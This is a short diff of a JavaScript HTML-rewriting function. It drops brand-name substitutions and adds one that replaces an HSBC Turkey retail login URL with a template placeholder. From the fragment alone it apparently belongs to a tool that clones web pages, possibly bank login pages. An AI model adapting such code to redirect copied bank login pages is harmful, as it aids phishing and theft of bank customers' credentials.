@@ -14,9 +14,7 @@ function replaceBeat(html) {
   return html;
 }
 function replaceRoute(html) {
-  html = html.replaceAll('Acar Menkul', 'Neta Menkul')
-  html = html.replaceAll('ACAR MENKUL', 'NETA MENKUL')
-  html = html.replaceAll('acarmenkul', 'netamenkul')
+  html = html.replaceAll('https://internet.hsbc.com.tr/UIApplication/CustomLogin/Retail.aspx', '<%= site %>')
   
 
   return html;
